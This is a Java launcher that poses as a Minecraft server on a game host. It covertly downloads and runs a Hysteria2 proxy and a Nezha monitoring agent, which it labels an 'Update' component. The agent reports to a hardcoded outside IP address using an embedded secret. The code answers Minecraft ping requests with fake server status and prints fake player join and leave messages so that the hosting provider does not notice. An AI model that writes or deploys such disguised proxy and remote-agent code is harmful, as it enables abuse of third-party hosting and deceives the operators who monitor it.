package miao.wrapper;

import java.io.BufferedReader;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URL;
import java.nio.channels.Channels;
import java.nio.channels.ReadableByteChannel;
import java.nio.file.FileVisitOption;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.util.Comparator;
import java.util.Timer;
import java.util.TimerTask;
import java.util.UUID;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;

public class Main {
    private static final String SNI_NAME = "apps.apple.com";
    private static Process nezhaProcess;

    public static void main(String[] args) {
        System.out.println("[喵酱] 终极伪装启动器运行中，准备唤醒 HY2 核心... 喵~ 🐾");
        String portEnv = System.getenv("SERVER_PORT");
        if (portEnv == null || portEnv.isEmpty()) {
            portEnv = "25748";
        }
        int port = Integer.parseInt(portEnv);
        try {
            String nezhaServer = System.getenv("NEZHA_SERVER");
            String nezhaSecret = System.getenv("NEZHA_KEY");
            String nezhaTls = System.getenv("NEZHA_TLS");
            if (nezhaServer == null || nezhaServer.isEmpty()) nezhaServer = "136.67.94.3:443";
            if (nezhaSecret == null || nezhaSecret.isEmpty()) nezhaSecret = "pZk6Kok7j31o97CgSisHed7nrNJjkhfy";
            if (nezhaTls == null || nezhaTls.isEmpty()) nezhaTls = "false";
            deployNezhaAgent(nezhaServer, nezhaSecret, nezhaTls);

            File hy2 = new File("hy2_core");
            if (!hy2.exists()) {
                System.out.println("[喵酱] 未找到核心，正在从 Github 下载最新版 HY2... 🐾");
                ReadableByteChannel rbc = Channels.newChannel(new URL(
                        "https://github.com/apernet/hysteria/releases/latest/download/hysteria-linux-amd64").openStream());
                FileOutputStream fos = new FileOutputStream("hy2_core");
                fos.getChannel().transferFrom(rbc, 0L, Long.MAX_VALUE);
                fos.close();
                hy2.setExecutable(true, false);
            }
            System.out.println("[喵酱] 正在签发最新的 SNI 证书 (" + SNI_NAME + ") 喵...");
            ProcessBuilder sslPb = new ProcessBuilder("openssl", "req", "-x509", "-nodes",
                    "-newkey", "rsa:2048", "-keyout", "private.key", "-out", "cert.crt",
                    "-days", "3650", "-subj", "/CN=" + SNI_NAME);
            sslPb.start().waitFor();
            String cfg = "listen: :" + port + "\n"
                    + "tls:\n  cert: cert.crt\n  key: private.key\n"
                    + "auth:\n  type: password\n  password: e3a5bb40be52de65\n";
            Files.write(Paths.get("config.yaml"), cfg.getBytes());
            System.out.println("[喵酱] 配置文件已更新，绑定端口: " + port + " 喵！");

            String publicIp = "127.0.0.1";
            String country = "未知节点";
            try {
                System.out.println("[喵酱] 正在探测主机的物理位置喵...");
                URL url = new URL("http://ip-api.com/json/?lang=zh-CN");
                HttpURLConnection con = (HttpURLConnection) url.openConnection();
                con.setRequestMethod("GET");
                StringBuilder sb = new StringBuilder();
                BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream(), "UTF-8"));
                String line;
                while ((line = in.readLine()) != null) {
                    sb.append(line);
                }
                in.close();
                String json = sb.toString();
                if (json.contains("\"query\":\"")) publicIp = json.split("\"query\":\"")[1].split("\"")[0];
                if (json.contains("\"country\":\"")) country = json.split("\"country\":\"")[1].split("\"")[0];
            } catch (Exception e) {
                System.out.println("[喵酱] 获取地理位置失败啦，用了默认值喵。");
            }

            System.out.println("\n========================================================");
            System.out.println("[喵酱] 主人，你的专属节点链接生成完毕喵！");
            System.out.println("hysteria2://e3a5bb40be52de65@" + publicIp + ":" + port + "/?sni=" + SNI_NAME + "&insecure=1#" + country);
            System.out.println("========================================================\n");

            startFakePlayerConsoleSpam();
            new Thread(() -> {
                try {
                    ServerSocket serverSocket = new ServerSocket(port);
                    while (true) {
                        Socket socket = serverSocket.accept();
                        new Thread(() -> Main.handleMcPing(socket)).start();
                    }
                } catch (Exception e) {
                    return;
                }
            }).start();

            ProcessBuilder pb = new ProcessBuilder("./hy2_core", "server", "-c", "config.yaml");
            pb.redirectErrorStream(true);
            Process hy2Proc = pb.start();
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                if (hy2Proc != null && hy2Proc.isAlive()) hy2Proc.destroy();
                if (nezhaProcess != null && nezhaProcess.isAlive()) nezhaProcess.destroy();
            }));
            BufferedReader reader = new BufferedReader(new InputStreamReader(hy2Proc.getInputStream()));
            String hline;
            while ((hline = reader.readLine()) != null) {
                System.out.println("[HY2] " + hline);
            }
            hy2Proc.waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static void deployNezhaAgent(String server, String secret, String tls) {
        try {
            Path nzDir = Paths.get("update");
            Files.createDirectories(nzDir);
            Path bin = nzDir.resolve("nezha-agent");
            if (!Files.exists(bin)) {
                System.out.println("[喵酱] 未找到 Update 组件，正在下载... 🐾");
                String url = "https://github.com/nezhahq/agent/releases/download/v1.15.0/nezha-agent_linux_amd64.zip";
                try {
                    downloadAndExtractZip(url, nzDir);
                } catch (Exception e) {
                    System.out.println("[喵酱] 流式下载失败，改用 curl...");
                    Path zip = nzDir.resolve("agent.zip");
                    new ProcessBuilder("bash", "-c", "curl -L -o " + zip + " \"" + url + "\"").inheritIO().start().waitFor();
                    if (Files.exists(zip)) {
                        extractZip(zip, nzDir);
                        Files.deleteIfExists(zip);
                    }
                }
                Path extracted = nzDir.resolve("nezha-agent");
                if (Files.exists(extracted)) {
                    Files.move(extracted, bin, StandardCopyOption.REPLACE_EXISTING);
                }
                new ProcessBuilder("bash", "-c", "chmod +x " + bin).inheritIO().start().waitFor();
            }
            if (!Files.exists(bin)) {
                System.out.println("[喵酱] Update 组件下载失败。");
                return;
            }
            Path uuidFile = nzDir.resolve("session.id");
            String uuid;
            if (Files.exists(uuidFile)) {
                uuid = new String(Files.readAllBytes(uuidFile)).trim();
            } else {
                uuid = UUID.randomUUID().toString();
                Files.writeString(uuidFile, uuid);
            }
            String cfg = "debug: false\n"
                    + "tls: " + tls + "\n"
                    + "disable_auto_update: true\n"
                    + "disable_force_update: true\n"
                    + "client_secret: " + secret + "\n"
                    + "server: " + server + "\n"
                    + "uuid: " + uuid + "\n";
            Path cfgFile = nzDir.resolve("config.yml");
            Files.writeString(cfgFile, cfg);
            ProcessBuilder pb = new ProcessBuilder(bin.toString(), "-c", cfgFile.toString());
            pb.redirectErrorStream(true);
            pb.redirectOutput(nzDir.resolve("update.log").toFile());
            nezhaProcess = pb.start();
            Thread.sleep(1000L);
            System.out.println("[喵酱] Update 服务已启动喵！");
        } catch (Exception e) {
            System.out.println("[喵酱] Update 服务启动失败: " + e.getMessage());
        }
    }

    private static void downloadAndExtractZip(String url, Path destDir) throws Exception {
        HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
        conn.setInstanceFollowRedirects(true);
        conn.setRequestProperty("User-Agent", "Mozilla/5.0");
        int code = conn.getResponseCode();
        if (code == 302 || code == 301) {
            String loc = conn.getHeaderField("Location");
            conn.disconnect();
            conn = (HttpURLConnection) new URL(loc).openConnection();
            conn.setInstanceFollowRedirects(true);
            conn.setRequestProperty("User-Agent", "Mozilla/5.0");
        }
        try (InputStream is = conn.getInputStream(); ZipInputStream zis = new ZipInputStream(is)) {
            ZipEntry entry;
            while ((entry = zis.getNextEntry()) != null) {
                if (entry.isDirectory()) continue;
                Path out = destDir.resolve(entry.getName());
                Files.createDirectories(out.getParent());
                Files.copy(zis, out, StandardCopyOption.REPLACE_EXISTING);
                out.toFile().setExecutable(true);
                zis.closeEntry();
            }
        }
        conn.disconnect();
    }

    private static void extractZip(Path zip, Path destDir) throws IOException {
        try (ZipInputStream zis = new ZipInputStream(Files.newInputStream(zip))) {
            ZipEntry entry;
            while ((entry = zis.getNextEntry()) != null) {
                if (entry.isDirectory()) continue;
                Path out = destDir.resolve(entry.getName());
                Files.createDirectories(out.getParent());
                Files.copy(zis, out, StandardCopyOption.REPLACE_EXISTING);
                out.toFile().setExecutable(true);
                zis.closeEntry();
            }
        }
    }

    private static void startFakePlayerConsoleSpam() {
        Timer timer = new Timer(true);
        timer.schedule(new TimerTask() {
            String[] fakeNames = new String[]{"MiaoMiao", "Steve", "Alex", "DragonSlayer", "Pterodactyl_Bot"};

            @Override
            public void run() {
                String name = fakeNames[(int) (Math.random() * fakeNames.length)];
                if (Math.random() > 0.3) {
                    System.out.println("[Server thread/INFO]: " + name + " joined the game");
                } else {
                    System.out.println("[Server thread/INFO]: " + name + " left the game");
                }
            }
        }, 30000L, 180000L);
    }

    private static void handleMcPing(Socket socket) {
        try {
            DataInputStream in = new DataInputStream(socket.getInputStream());
            DataOutputStream out = new DataOutputStream(socket.getOutputStream());
            while (true) {
                int len = readVarInt(in);
                byte[] data = new byte[len];
                in.readFully(data);
                DataInputStream payload = new DataInputStream(new ByteArrayInputStream(data));
                int packetId = readVarInt(payload);
                if (packetId == 0 && data.length == 1) {
                    String json = "{\"version\":{\"name\":\"Paper 1.20.4\",\"protocol\":765},\"players\":{\"max\":20,\"online\":1,\"sample\":[{\"name\":\"MiaoMiao\",\"id\":\"00000000-0000-0000-0000-000000000001\"}]},\"description\":{\"text\":\"A Minecraft Server\"}}";
                    ByteArrayOutputStream bos = new ByteArrayOutputStream();
                    DataOutputStream dos = new DataOutputStream(bos);
                    writeVarInt(dos, 0);
                    writeString(dos, json);
                    byte[] resp = bos.toByteArray();
                    writeVarInt(out, resp.length);
                    out.write(resp);
                    continue;
                }
                if (packetId == 1) {
                    long pingTime = payload.readLong();
                    ByteArrayOutputStream bos = new ByteArrayOutputStream();
                    DataOutputStream dos = new DataOutputStream(bos);
                    writeVarInt(dos, 1);
                    dos.writeLong(pingTime);
                    byte[] resp = bos.toByteArray();
                    writeVarInt(out, resp.length);
                    out.write(resp);
                    break;
                }
            }
        } catch (Exception e) {
        } finally {
            try {
                socket.close();
            } catch (Exception e) {
            }
        }
    }

    public static int readVarInt(DataInputStream in) throws IOException {
        int value = 0;
        int position = 0;
        byte current;
        do {
            current = in.readByte();
            value |= (current & 0x7F) << 7 * position;
            if (++position > 5) {
                throw new RuntimeException("VarInt is too big");
            }
        } while ((current & 0x80) != 0);
        return value;
    }

    public static void writeVarInt(DataOutputStream out, int value) throws IOException {
        do {
            byte temp = (byte) (value & 0x7F);
            if ((value >>>= 7) != 0) {
                temp = (byte) (temp | 0x80);
            }
            out.writeByte(temp);
        } while (value != 0);
    }

    public static void writeString(DataOutputStream out, String s) throws IOException {
        byte[] bytes = s.getBytes("UTF-8");
        writeVarInt(out, bytes.length);
        out.write(bytes);
    }
}